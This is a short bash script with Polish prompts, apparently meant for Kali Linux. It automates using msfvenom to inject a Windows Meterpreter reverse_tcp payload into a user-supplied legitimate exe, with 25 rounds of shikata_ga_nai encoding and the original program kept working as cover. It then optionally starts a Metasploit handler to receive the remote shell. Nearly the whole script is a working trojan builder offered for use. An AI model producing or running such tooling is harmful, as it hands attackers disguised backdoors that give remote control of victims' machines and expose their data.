#! /bin/bash
# METASPLOIT AUTOMATIC SCRIPT INJECT PAYLOAD TO EXE FILE
echo "

 ███▄ ▄███▓▓█████▄▄▄█████▓ ▄▄▄        ██████  ██▓███   ██▓     ▒█████   ██▓▄▄▄█████▓
▓██▒▀█▀ ██▒▓█   ▀▓  ██▒ ▓▒▒████▄    ▒██    ▒ ▓██░  ██▒▓██▒    ▒██▒  ██▒▓██▒▓  ██▒ ▓▒
▓██    ▓██░▒███  ▒ ▓██░ ▒░▒██  ▀█▄  ░ ▓██▄   ▓██░ ██▓▒▒██░    ▒██░  ██▒▒██▒▒ ▓██░ ▒░
▒██    ▒██ ▒▓█  ▄░ ▓██▓ ░ ░██▄▄▄▄██   ▒   ██▒▒██▄█▓▒ ▒▒██░    ▒██   ██░░██░░ ▓██▓ ░ 
▒██▒   ░██▒░▒████▒ ▒██▒ ░  ▓█   ▓██▒▒██████▒▒▒██▒ ░  ░░██████▒░ ████▓▒░░██░  ▒██▒ ░ 
░ ▒░   ░  ░░░ ▒░ ░ ▒ ░░    ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░ ▒░▓  ░░ ▒░▒░▒░ ░▓    ▒ ░░   
░  ░      ░ ░ ░  ░   ░      ▒   ▒▒ ░░ ░▒  ░ ░░▒ ░     ░ ░ ▒  ░  ░ ▒ ▒░  ▒ ░    ░    
░      ░      ░    ░        ░   ▒   ░  ░  ░  ░░         ░ ░   ░ ░ ░ ▒   ▒ ░  ░      
       ░      ░  ░              ░  ░      ░               ░  ░    ░ ░   ░                                                                                              
"
echo "Startuję skrypt ..."
read -r -p "Input exe file patch - " LOKALIZACJA
echo "Moving file to /home/kali/Desktop/ ..."
mv $LOKALIZACJA /home/kali/Desktop/
cd /home/kali/Desktop
read -r -p "Input the name of exe file (without exe) - " NAZWA
read -r -p "Input the payload IP adress - " IP
read -r -p "Input the payload port - " PORT
read -r -p "Input the payload name (without exe) - " LADUNEK
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp -f exe -k -e x86/shikata_ga_nai -i 25 -x /home/kali/Desktop/$NAZWA.exe LHOST=$IP LPORT=$PORT >$LADUNEK.exe
while true
do
 read -r -p "Do you want start metasploit ? (y/n) - " ODPOWIEDZ
 
 case $ODPOWIEDZ in
     [yY][eE][sS]|[yY])
  echo "Uruchamiam skrypt... "
  sleep 3
  sudo msfconsole -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp'
 break
 ;;
     [nN][eE][sS]|[nN])
 break
        ;;
     *)
 echo "Invalid input..."
 ;;
  esac
done
while true
do
 read -r -p "Do you want start script again ? (y/n) - " ODPOWIEDZ2
 
 case $ODPOWIEDZ2 in
     [yY][eE][sS]|[yY])
  echo "Uruchamiam skrypt... "
  cd /home/kali/Desktop/KOZ1OLMENU
  clear
  ./K0Z1OLMENU.sh
 break
 ;;
     [nN][eE][sS]|[nN])
  echo "Thanks for using my script !"
  exit 1
 break
        ;;
     *)
 echo "Invalid input..."
 ;;
  esac
done